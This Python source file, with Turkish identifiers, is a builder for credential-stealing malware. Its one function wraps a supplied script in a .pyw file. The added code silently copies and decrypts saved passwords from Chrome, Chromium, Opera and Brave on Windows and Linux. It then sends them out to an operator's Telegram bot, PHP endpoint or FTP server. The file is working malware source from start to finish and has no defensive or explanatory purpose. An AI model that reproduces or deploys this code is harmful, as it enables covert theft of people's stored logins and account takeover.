def injection(injection=None,tip=None,arayuz=None,yol=None,url=None,id=None,token=None,ftp_host=None,ftp_username=None,ftp_pass=None,sistem=None,yesil=None,normal=None):
    yaz = open(f"{arayuz}_{tip}_{yol}.pyw","wb")

    liste = []
    for i in injection.splitlines():
        if i.startswith("import") or i.startswith("from"):
            liste.append(i)
        else:
            if i.strip().startswith("#"):pass
            else:break
    if liste:liste_son = liste[-1];liste_son_index = injection.rfind(liste_son);liste_son_eleman = len(liste_son);injection = injection[liste_son_index+liste_son_eleman:]
    def ekle(import_name):
        if not import_name in liste:
            liste.append(import_name)

    for i in ["import os","import platform","import shutil","import sqlite3","import requests","import threading"]:ekle(i)
    veri = "# -*- coding: utf-8 -*-\n"+"\n".join(liste)+"\n{}\nisim=os.getlogin()\ndef baslat():\n\t{}\n\nthreading.Thread(target=baslat).start()"
    veri2 = injection
    
    if sistem == "Windows":
        kutuphane = "import win32crypt"
        if tip == "hepsi":
            data = """
    chrome = ["C:/Users/"+isim+"/AppData/Local/Google/Chrome/User Data/Default/"]
    chromium = ["C:/Users/"+isim+"/AppData/Local/Google/Chromium/User Data/Default/"]
    opera = ["C:/Users/"+isim+"/AppData/Roaming/Opera Software/Opera GX Stable/","C:/Users/"+isim+"/AppData/Roaming/Opera Software/Opera GX Stable/"]
    brave = ["C:/Users/"+isim+"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/"]
    konumlar = [chrome,chromium,opera,brave]
    for konum in konumlar:
        for i in konum:
            if os.path.exists(i):
                sifreler = str(platform.uname())+"___\\n"
                shutil.copy2(i+"Login Data",i+"Data")
                data = sqlite3.connect(i+"Data")
                imlec = data.cursor()
                imlec.execute('SELECT signon_realm, username_value, password_value FROM logins')
                for maden in imlec.fetchall():
                    try:
                        password = win32crypt.CryptUnprotectData(maden[2])[1].decode()
                    except:password = "Alınamadı !"
                    sifre = "\\nUrl :"+maden[0]+"\\nkul. adi : "+maden[1]+"\\nSifre : "+password+"\\n"
                    sifreler = sifreler+sifre
                {}
"""
            if yol == "telegram":
                id = str(id)
                icerik = '''{'chat_id':"'''+id+'''",'text':sifreler}'''
                telegram = """if not requests.post("https://api.telegram.org/bot"""+token+"""/sendMessage",data={'chat_id':"""+str(id)+""",'text':sifreler}).status_code == 200:requests.post("https://api.telegram.org/bot"""+token+"""/sendDocument?chat_id="""+str(id)+"""",files={"document":sifreler.encode()})"""
                data = data.format(telegram)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            
            elif yol == "php":
                icerik = '''{'isim':isim,'dosya':isim+'/'+isim+'_pass.txt','icerik':sifreler}'''
                php = f"""requests.post("{url}",data={icerik})"""
                data = data.format(php)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            elif yol == "ftp":
                ftp = f"""ftp=ftplib.FTP("{ftp_host}","{ftp_username}","{ftp_pass}");ftp.storlines("STOR "+isim+"_pass.txt",sifreler,1024);ftp.quit()"""
                data = data.format(ftp)
                veri = veri.format(kutuphane+",ftplib",data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{str(arayuz)}_{str(tip)}_{str(yol)}.pyw Yazıldı !"+normal)

        elif tip == "chrome":
            data = """
    chrome = ["C:/Users/"+isim+"/AppData/Local/Google/Chrome/User Data/Default/"]
    chromium = ["C:/Users/"+isim+"/AppData/Local/Google/Chromium/User Data/Default/"]
    opera = ["C:/Users/"+isim+"/AppData/Roaming/Opera Software/Opera GX Stable/","C:/Users/"+isim+"/AppData/Roaming/Opera Software/Opera GX Stable/"]
    brave = ["C:/Users/"+isim+"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/"]
    konumlar = [chrome,chromium,opera,brave]
    for i in chrome:
        if os.path.exists(i):
            sifreler = str(platform.uname())+"___\\n"
            shutil.copy2(i+"Login Data",i+"Data")
            data = sqlite3.connect(i+"Data")
            imlec = data.cursor()
            imlec.execute('SELECT signon_realm, username_value, password_value FROM logins')
            for maden in imlec.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(maden[2])[1].decode()
                except:password = "Alınamadı !"
                sifre = "\\nUrl :"+maden[0]+"\\nkul. adi : "+maden[1]+"\\nSifre : "+password+"\\n"
                sifreler = sifreler+sifre
            {}
"""
            if yol == "telegram":
                id = str(id)
                icerik = '''{'chat_id':"'''+id+'''",'text':sifreler}'''
                telegram = """if not requests.post("https://api.telegram.org/bot"""+token+"""/sendMessage",data={'chat_id':"""+str(id)+""",'text':sifreler}).status_code == 200:requests.post("https://api.telegram.org/bot"""+token+"""/sendDocument?chat_id="""+str(id)+"""",files={"document":sifreler.encode()})"""
                data = data.format(telegram)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            
            elif yol == "php":
                icerik = '''{'isim':isim,'dosya':isim+'/'+isim+'_pass.txt','icerik':sifreler}'''
                php = f"""requests.post("{url}",data={icerik})"""
                data = data.format(php)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            elif yol == "ftp":
                ftp = f"""ftp=ftplib.FTP("{ftp_host}","{ftp_username}","{ftp_pass}");ftp.storlines("STOR "+isim+"_pass.txt",sifreler,1024);ftp.quit()"""
                data = data.format(ftp)
                veri = veri.format(kutuphane+",ftplib",data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{str(arayuz)}_{str(tip)}_{str(yol)}.pyw Yazıldı !"+normal)

        elif tip == "chromium":
            data = """
    chrome = ["C:/Users/"+isim+"/AppData/Local/Google/Chrome/User Data/Default/"]
    chromium = ["C:/Users/"+isim+"/AppData/Local/Google/Chromium/User Data/Default/"]
    opera = ["C:/Users/"+isim+"/AppData/Roaming/Opera Software/Opera GX Stable/","C:/Users/"+isim+"/AppData/Roaming/Opera Software/Opera GX Stable/"]
    brave = ["C:/Users/"+isim+"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/"]
    konumlar = [chrome,chromium,opera,brave]
    for i in chromium:
        if os.path.exists(i):
            sifreler = str(platform.uname())+"___\\n"
            shutil.copy2(i+"Login Data",i+"Data")
            data = sqlite3.connect(i+"Data")
            imlec = data.cursor()
            imlec.execute('SELECT signon_realm, username_value, password_value FROM logins')
            for maden in imlec.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(maden[2])[1].decode()
                except:password = "Alınamadı !"
                sifre = "\\nUrl :"+maden[0]+"\\nkul. adi : "+maden[1]+"\\nSifre : "+password+"\\n"
                sifreler = sifreler+sifre
            {}
"""
            if yol == "telegram":
                id = str(id)
                icerik = '''{'chat_id':"'''+id+'''",'text':sifreler}'''
                telegram = """if not requests.post("https://api.telegram.org/bot"""+token+"""/sendMessage",data={'chat_id':"""+str(id)+""",'text':sifreler}).status_code == 200:requests.post("https://api.telegram.org/bot"""+token+"""/sendDocument?chat_id="""+str(id)+"""",files={"document":sifreler.encode()})"""
                data = data.format(telegram)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            
            elif yol == "php":
                icerik = '''{'isim':isim,'dosya':isim+'/'+isim+'_pass.txt','icerik':sifreler}'''
                php = f"""requests.post("{url}",data={icerik})"""
                data = data.format(php)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            elif yol == "ftp":
                ftp = f"""ftp=ftplib.FTP("{ftp_host}","{ftp_username}","{ftp_pass}");ftp.storlines("STOR "+isim+"_pass.txt",sifreler,1024);ftp.quit()"""
                data = data.format(ftp)
                veri = veri.format(kutuphane+",ftplib",data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{str(arayuz)}_{str(tip)}_{str(yol)}.pyw Yazıldı !"+normal)

        elif tip == "opera":
            data = """
    chrome = ["C:/Users/"+isim+"/AppData/Local/Google/Chrome/User Data/Default/"]
    chromium = ["C:/Users/"+isim+"/AppData/Local/Google/Chromium/User Data/Default/"]
    opera = ["C:/Users/"+isim+"/AppData/Roaming/Opera Software/Opera GX Stable/","C:/Users/"+isim+"/AppData/Roaming/Opera Software/Opera GX Stable/"]
    brave = ["C:/Users/"+isim+"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/"]
    konumlar = [chrome,chromium,opera,brave]
    for i in opera:
        if os.path.exists(i):
            sifreler = str(platform.uname())+"___\\n"
            shutil.copy2(i+"Login Data",i+"Data")
            data = sqlite3.connect(i+"Data")
            imlec = data.cursor()
            imlec.execute('SELECT signon_realm, username_value, password_value FROM logins')
            for maden in imlec.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(maden[2])[1].decode()
                except:password = "Alınamadı !"
                sifre = "\\nUrl :"+maden[0]+"\\nkul. adi : "+maden[1]+"\\nSifre : "+password+"\\n"
                sifreler = sifreler+sifre
            {}
"""
            if yol == "telegram":
                id = str(id)
                icerik = '''{'chat_id':"'''+id+'''",'text':sifreler}'''
                telegram = """if not requests.post("https://api.telegram.org/bot"""+token+"""/sendMessage",data={'chat_id':"""+str(id)+""",'text':sifreler}).status_code == 200:requests.post("https://api.telegram.org/bot"""+token+"""/sendDocument?chat_id="""+str(id)+"""",files={"document":sifreler.encode()})"""
                data = data.format(telegram)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            
            elif yol == "php":
                icerik = '''{'isim':isim,'dosya':isim+'/'+isim+'_pass.txt','icerik':sifreler}'''
                php = f"""requests.post("{url}",data={icerik})"""
                data = data.format(php)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            elif yol == "ftp":
                ftp = f"""ftp=ftplib.FTP("{ftp_host}","{ftp_username}","{ftp_pass}");ftp.storlines("STOR "+isim+"_pass.txt",sifreler,1024);ftp.quit()"""
                data = data.format(ftp)
                veri = veri.format(kutuphane+",ftplib",data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{str(arayuz)}_{str(tip)}_{str(yol)}.pyw Yazıldı !"+normal)

        elif tip == "brave":
            data = """
    chrome = ["C:/Users/"+isim+"/AppData/Local/Google/Chrome/User Data/Default/"]
    chromium = ["C:/Users/"+isim+"/AppData/Local/Google/Chromium/User Data/Default/"]
    opera = ["C:/Users/"+isim+"/AppData/Roaming/Opera Software/Opera GX Stable/","C:/Users/"+isim+"/AppData/Roaming/Opera Software/Opera GX Stable/"]
    brave = ["C:/Users/"+isim+"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/"]
    konumlar = [chrome,chromium,opera,brave]
    for i in brave:
        if os.path.exists(i):
            sifreler = str(platform.uname())+"___\\n"
            shutil.copy2(i+"Login Data",i+"Data")
            data = sqlite3.connect(i+"Data")
            imlec = data.cursor()
            imlec.execute('SELECT signon_realm, username_value, password_value FROM logins')
            for maden in imlec.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(maden[2])[1].decode()
                except:password = "Alınamadı !"
                sifre = "\\nUrl :"+maden[0]+"\\nkul. adi : "+maden[1]+"\\nSifre : "+password+"\\n"
                sifreler = sifreler+sifre
            {}
"""
            if yol == "telegram":
                id = str(id)
                icerik = '''{'chat_id':"'''+id+'''",'text':sifreler}'''
                telegram = """if not requests.post("https://api.telegram.org/bot"""+token+"""/sendMessage",data={'chat_id':"""+str(id)+""",'text':sifreler}).status_code == 200:requests.post("https://api.telegram.org/bot"""+token+"""/sendDocument?chat_id="""+str(id)+"""",files={"document":sifreler.encode()})"""
                data = data.format(telegram)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            
            elif yol == "php":
                icerik = '''{'isim':isim,'dosya':isim+'/'+isim+'_pass.txt','icerik':sifreler}'''
                php = f"""requests.post("{url}",data={icerik})"""
                data = data.format(php)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            elif yol == "ftp":
                ftp = f"""ftp=ftplib.FTP("{ftp_host}","{ftp_username}","{ftp_pass}");ftp.storlines("STOR "+isim+"_pass.txt",sifreler,1024);ftp.quit()"""
                data = data.format(ftp)
                veri = veri.format(kutuphane+",ftplib",data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{str(arayuz)}_{str(tip)}_{str(yol)}.pyw Yazıldı !"+normal)
    

    elif sistem == "Linux":
        kutuphane = "from Crypto.Cipher import AES\nfrom Crypto.Protocol.KDF import PBKDF2"
        if tip == "hepsi":
            data = """
    chrome = ["/home/"+isim+".config/google-chrome/Default/","/home/"+isim+"/.config/chrome/Default/","/home/"+isim+"/.config/chrome-browser/Default/","/root/.config/google-chrome/Default/","/root/.config/chrome/Default/","/root/.config/chrome-browser/Default/"]
    chromium = ["/home/"+isim+".config/google-chromium/Default/","/home/"+isim+"/.config/chromium/Default/","/home/"+isim+"/.config/chromium-browser/Default/","/root/.config/google-chromium/Default/","/root/.config/chromium/Default/","/root/.config/chromium-browser/Default/"]
    opera = ["/home/"+isim+"/.config/opera/","/home/"+isim+"/.config/opera-beta/","/root/.config/opera/","/root/.config/opera-beta/"]
    brave = ["/home/"+isim+"/.config/BraveSoftware/Brave-Browser/Default/","/root/.config/BraveSoftware/Brave-Browser/Default/"]
    konumlar = [chrome,chromium,opera,brave]

    def al(crypt):
        try:
            salt = b"saltysalt"
            iv = b" "*16
            lenght = 16
            iterations = 1
            pb_pass = b"peanuts"
            key = PBKDF2(pb_pass,salt,lenght,iterations)
            cipher = AES.new(key,AES.MODE_CBC,IV=iv)
            encrpy_pass = crypt[3:]
            deneme = cipher.decrypt(encrpy_pass)
            return deneme.decode()
        except:
            return "Alınamadı !"

    for konums in konumlar:
        for konum in konums:
            if os.path.exists(konum):
                sifreler = str(platform.uname())+"___\\n"
                shutil.copy2(konum+"Login Data",konum+"Data")
                data = sqlite3.connect(konum+"Data")
                imlec = data.cursor()
                imlec.execute("SELECT action_url,username_value,password_value FROM logins")

                for veri in imlec.fetchall():
                    sifre = "\\nURL : "+veri[0]+"\\nUSNAME : "+veri[1]+"\\nPASS : "+al(veri[2])+"\\n"
                    sifreler = sifreler + sifre
                {}
"""
            if yol == "telegram":
                id = str(id)
                icerik = '''{'document':sifreler.encode()}'''
                telegram = """if not requests.post("https://api.telegram.org/bot"""+token+"""/sendMessage",data={'chat_id':"""+str(id)+""",'text':sifreler}).status_code == 200:requests.post("https://api.telegram.org/bot"""+token+"""/sendDocument?chat_id="""+str(id)+"""",files={"document":sifreler.encode()})"""
                data = data.format(telegram)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            
            elif yol == "php":
                icerik = '''{'isim':isim,'dosya':isim+'/'+isim+'_pass.txt','icerik':sifreler}'''
                php = f"""requests.post("{url}",data={icerik})"""
                data = data.format(php)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            elif yol == "ftp":
                ftp = f"""ftp=ftplib.FTP("{ftp_host}","{ftp_username}","{ftp_pass}");ftp.storlines("STOR "+isim+"_pass.txt",sifreler,1024);ftp.quit()"""
                data = data.format(ftp)
                veri = veri.format(kutuphane+"\nimport ftplib",data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{str(arayuz)}_{str(tip)}_{str(yol)}.pyw Yazıldı !"+normal)

        elif tip == "chrome":
            data = """
    chrome = ["/home/"+isim+".config/google-chrome/Default/","/home/"+isim+"/.config/chrome/Default/","/home/"+isim+"/.config/chrome-browser/Default/","/root/.config/google-chrome/Default/","/root/.config/chrome/Default/","/root/.config/chrome-browser/Default/"]
    chromium = ["/home/"+isim+".config/google-chromium/Default/","/home/"+isim+"/.config/chromium/Default/","/home/"+isim+"/.config/chromium-browser/Default/","/root/.config/google-chromium/Default/","/root/.config/chromium/Default/","/root/.config/chromium-browser/Default/"]
    opera = ["/home/"+isim+"/.config/opera/","/home/"+isim+"/.config/opera-beta/","/root/.config/opera/","/root/.config/opera-beta/"]
    brave = ["/home/"+isim+"/.config/BraveSoftware/Brave-Browser/Default/","/root/.config/BraveSoftware/Brave-Browser/Default/"]
    konumlar = [chrome,chromium,opera,brave]

    def al(crypt):
        try:
            salt = b"saltysalt"
            iv = b" "*16
            lenght = 16
            iterations = 1
            pb_pass = b"peanuts"
            key = PBKDF2(pb_pass,salt,lenght,iterations)
            cipher = AES.new(key,AES.MODE_CBC,IV=iv)
            encrpy_pass = crypt[3:]
            deneme = cipher.decrypt(encrpy_pass)
            return deneme.decode()
        except:
            return "Alınamadı !"

    for konum in chrome:
        if os.path.exists(konum):
            sifreler = str(platform.uname())+"___\\n"
            shutil.copy2(konum+"Login Data",konum+"Data")
            data = sqlite3.connect(konum+"Data")
            imlec = data.cursor()
            imlec.execute("SELECT action_url,username_value,password_value FROM logins")

            for veri in imlec.fetchall():
                sifre = "\\nURL : "+veri[0]+"\\nUSNAME : "+veri[1]+"\\nPASS : "+al(veri[2])+"\\n"
                sifreler = sifreler + sifre
            {}
"""
            if yol == "telegram":
                id = str(id)
                icerik = '''{'document':sifreler.encode()}'''
                telegram = """if not requests.post("https://api.telegram.org/bot"""+token+"""/sendMessage",data={'chat_id':"""+str(id)+""",'text':sifreler}).status_code == 200:requests.post("https://api.telegram.org/bot"""+token+"""/sendDocument?chat_id="""+str(id)+"""",files={"document":sifreler.encode()})"""
                data = data.format(telegram)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            
            elif yol == "php":
                icerik = '''{'isim':isim,'dosya':isim+'/'+isim+'_pass.txt','icerik':sifreler}'''
                php = f"""requests.post("{url}",data={icerik})"""
                data = data.format(php)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            elif yol == "ftp":
                ftp = f"""ftp=ftplib.FTP("{ftp_host}","{ftp_username}","{ftp_pass}");ftp.storlines("STOR "+isim+"_pass.txt",sifreler,1024);ftp.quit()"""
                data = data.format(ftp)
                veri = veri.format(kutuphane+"\nimport ftplib",data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{str(arayuz)}_{str(tip)}_{str(yol)}.pyw Yazıldı !"+normal)

        elif tip == "chromium":
            data = """
    chrome = ["/home/"+isim+".config/google-chrome/Default/","/home/"+isim+"/.config/chrome/Default/","/home/"+isim+"/.config/chrome-browser/Default/","/root/.config/google-chrome/Default/","/root/.config/chrome/Default/","/root/.config/chrome-browser/Default/"]
    chromium = ["/home/"+isim+".config/google-chromium/Default/","/home/"+isim+"/.config/chromium/Default/","/home/"+isim+"/.config/chromium-browser/Default/","/root/.config/google-chromium/Default/","/root/.config/chromium/Default/","/root/.config/chromium-browser/Default/"]
    opera = ["/home/"+isim+"/.config/opera/","/home/"+isim+"/.config/opera-beta/","/root/.config/opera/","/root/.config/opera-beta/"]
    brave = ["/home/"+isim+"/.config/BraveSoftware/Brave-Browser/Default/","/root/.config/BraveSoftware/Brave-Browser/Default/"]
    konumlar = [chrome,chromium,opera,brave]

    def al(crypt):
        try:
            salt = b"saltysalt"
            iv = b" "*16
            lenght = 16
            iterations = 1
            pb_pass = b"peanuts"
            key = PBKDF2(pb_pass,salt,lenght,iterations)
            cipher = AES.new(key,AES.MODE_CBC,IV=iv)
            encrpy_pass = crypt[3:]
            deneme = cipher.decrypt(encrpy_pass)
            return deneme.decode()
        except:
            return "Alınamadı !"

    for konum in chromium:
        if os.path.exists(konum):
            sifreler = str(platform.uname())+"___\\n"
            shutil.copy2(konum+"Login Data",konum+"Data")
            data = sqlite3.connect(konum+"Data")
            imlec = data.cursor()
            imlec.execute("SELECT action_url,username_value,password_value FROM logins")

            for veri in imlec.fetchall():
                sifre = "\\nURL : "+veri[0]+"\\nUSNAME : "+veri[1]+"\\nPASS : "+al(veri[2])+"\\n"
                sifreler = sifreler + sifre
            {}
"""
            if yol == "telegram":
                id = str(id)
                icerik = '''{'document':sifreler.encode()}'''
                telegram = """if not requests.post("https://api.telegram.org/bot"""+token+"""/sendMessage",data={'chat_id':"""+str(id)+""",'text':sifreler}).status_code == 200:requests.post("https://api.telegram.org/bot"""+token+"""/sendDocument?chat_id="""+str(id)+"""",files={"document":sifreler.encode()})"""
                data = data.format(telegram)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            
            elif yol == "php":
                icerik = '''{'isim':isim,'dosya':isim+'/'+isim+'_pass.txt','icerik':sifreler}'''
                php = f"""requests.post("{url}",data={icerik})"""
                data = data.format(php)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            elif yol == "ftp":
                ftp = f"""ftp=ftplib.FTP("{ftp_host}","{ftp_username}","{ftp_pass}");ftp.storlines("STOR "+isim+"_pass.txt",sifreler,1024);ftp.quit()"""
                data = data.format(ftp)
                veri = veri.format(kutuphane+"\nimport ftplib",data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{str(arayuz)}_{str(tip)}_{str(yol)}.pyw Yazıldı !"+normal)

        elif tip == "opera":
            data = """
    chrome = ["/home/"+isim+".config/google-chrome/Default/","/home/"+isim+"/.config/chrome/Default/","/home/"+isim+"/.config/chrome-browser/Default/","/root/.config/google-chrome/Default/","/root/.config/chrome/Default/","/root/.config/chrome-browser/Default/"]
    chromium = ["/home/"+isim+".config/google-chromium/Default/","/home/"+isim+"/.config/chromium/Default/","/home/"+isim+"/.config/chromium-browser/Default/","/root/.config/google-chromium/Default/","/root/.config/chromium/Default/","/root/.config/chromium-browser/Default/"]
    opera = ["/home/"+isim+"/.config/opera/","/home/"+isim+"/.config/opera-beta/","/root/.config/opera/","/root/.config/opera-beta/"]
    brave = ["/home/"+isim+"/.config/BraveSoftware/Brave-Browser/Default/","/root/.config/BraveSoftware/Brave-Browser/Default/"]
    konumlar = [chrome,chromium,opera,brave]

    def al(crypt):
        try:
            salt = b"saltysalt"
            iv = b" "*16
            lenght = 16
            iterations = 1
            pb_pass = b"peanuts"
            key = PBKDF2(pb_pass,salt,lenght,iterations)
            cipher = AES.new(key,AES.MODE_CBC,IV=iv)
            encrpy_pass = crypt[3:]
            deneme = cipher.decrypt(encrpy_pass)
            return deneme.decode()
        except:
            return "Alınamadı !"

    for konum in opera:
        if os.path.exists(konum):
            sifreler = str(platform.uname())+"___\\n"
            shutil.copy2(konum+"Login Data",konum+"Data")
            data = sqlite3.connect(konum+"Data")
            imlec = data.cursor()
            imlec.execute("SELECT action_url,username_value,password_value FROM logins")

            for veri in imlec.fetchall():
                sifre = "\\nURL : "+veri[0]+"\\nUSNAME : "+veri[1]+"\\nPASS : "+al(veri[2])+"\\n"
                sifreler = sifreler + sifre
            {}
"""
            if yol == "telegram":
                id = str(id)
                icerik = '''{'document':sifreler.encode()}'''
                telegram = """if not requests.post("https://api.telegram.org/bot"""+token+"""/sendMessage",data={'chat_id':"""+str(id)+""",'text':sifreler}).status_code == 200:requests.post("https://api.telegram.org/bot"""+token+"""/sendDocument?chat_id="""+str(id)+"""",files={"document":sifreler.encode()})"""
                data = data.format(telegram)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            
            elif yol == "php":
                icerik = '''{'isim':isim,'dosya':isim+'/'+isim+'_pass.txt','icerik':sifreler}'''
                php = f"""requests.post("{url}",data={icerik})"""
                data = data.format(php)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            elif yol == "ftp":
                ftp = f"""ftp=ftplib.FTP("{ftp_host}","{ftp_username}","{ftp_pass}");ftp.storlines("STOR "+isim+"_pass.txt",sifreler,1024);ftp.quit()"""
                data = data.format(ftp)
                veri = veri.format(kutuphane+"\nimport ftplib",data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{str(arayuz)}_{str(tip)}_{str(yol)}.pyw Yazıldı !"+normal)

        elif tip == "brave":
            data = """
    chrome = ["/home/"+isim+".config/google-chrome/Default/","/home/"+isim+"/.config/chrome/Default/","/home/"+isim+"/.config/chrome-browser/Default/","/root/.config/google-chrome/Default/","/root/.config/chrome/Default/","/root/.config/chrome-browser/Default/"]
    chromium = ["/home/"+isim+".config/google-chromium/Default/","/home/"+isim+"/.config/chromium/Default/","/home/"+isim+"/.config/chromium-browser/Default/","/root/.config/google-chromium/Default/","/root/.config/chromium/Default/","/root/.config/chromium-browser/Default/"]
    opera = ["/home/"+isim+"/.config/opera/","/home/"+isim+"/.config/opera-beta/","/root/.config/opera/","/root/.config/opera-beta/"]
    brave = ["/home/"+isim+"/.config/BraveSoftware/Brave-Browser/Default/","/root/.config/BraveSoftware/Brave-Browser/Default/"]
    konumlar = [chrome,chromium,opera,brave]

    def al(crypt):
        try:
            salt = b"saltysalt"
            iv = b" "*16
            lenght = 16
            iterations = 1
            pb_pass = b"peanuts"
            key = PBKDF2(pb_pass,salt,lenght,iterations)
            cipher = AES.new(key,AES.MODE_CBC,IV=iv)
            encrpy_pass = crypt[3:]
            deneme = cipher.decrypt(encrpy_pass)
            return deneme.decode()
        except:
            return "Alınamadı !"

    for konum in brave:
        if os.path.exists(konum):
            sifreler = str(platform.uname())+"___\\n"
            shutil.copy2(konum+"Login Data",konum+"Data")
            data = sqlite3.connect(konum+"Data")
            imlec = data.cursor()
            imlec.execute("SELECT action_url,username_value,password_value FROM logins")

            for veri in imlec.fetchall():
                sifre = "\\nURL : "+veri[0]+"\\nUSNAME : "+veri[1]+"\\nPASS : "+al(veri[2])+"\\n"
                sifreler = sifreler + sifre
            {}
"""
            if yol == "telegram":
                id = str(id)
                icerik = '''{'document':sifreler.encode()}'''
                telegram = """if not requests.post("https://api.telegram.org/bot"""+token+"""/sendMessage",data={'chat_id':"""+str(id)+""",'text':sifreler}).status_code == 200:requests.post("https://api.telegram.org/bot"""+token+"""/sendDocument?chat_id="""+str(id)+"""",files={"document":sifreler.encode()})"""
                data = data.format(telegram)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            
            elif yol == "php":
                icerik = '''{'isim':isim,'dosya':isim+'/'+isim+'_pass.txt','icerik':sifreler}'''
                php = f"""requests.post("{url}",data={icerik})"""
                data = data.format(php)
                veri = veri.format(kutuphane,data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{arayuz}_{tip}_{yol}.pyw Yazıldı !"+normal)

            elif yol == "ftp":
                ftp = f"""ftp=ftplib.FTP("{ftp_host}","{ftp_username}","{ftp_pass}");ftp.storlines("STOR "+isim+"_pass.txt",sifreler,1024);ftp.quit()"""
                data = data.format(ftp)
                veri = veri.format(kutuphane+"\nimport ftplib",data)+injection
                yaz.write(veri.encode())
                yaz.close()
                print(yesil+f"\t{str(arayuz)}_{str(tip)}_{str(yol)}.pyw Yazıldı !"+normal)
